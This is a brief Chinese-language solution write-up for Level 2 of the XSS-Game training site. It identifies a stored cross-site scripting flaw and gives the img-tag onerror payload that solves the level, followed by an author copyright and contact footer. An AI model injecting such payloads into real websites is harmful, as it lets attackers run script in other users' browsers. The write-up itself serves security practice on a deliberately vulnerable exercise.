## [[XSS-Game](https://xss-game.appspot.com/)] [[Level-2](https://xss-game.appspot.com/level2)] [[解题报告](http://exp-blog.com/2019/02/15/pid-3333/)]

------

水题，明显是存储型 XSS 。

提交 `<img src=0 />`发现页面直接解析了

直接构造 payload 即可：

`<img src=0 onerror=alert("exp") />`

![](http://exp-blog.com/wp-content/uploads/2019/02/cc2f1d9e680a2ae6ba5345eb7634a58d.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
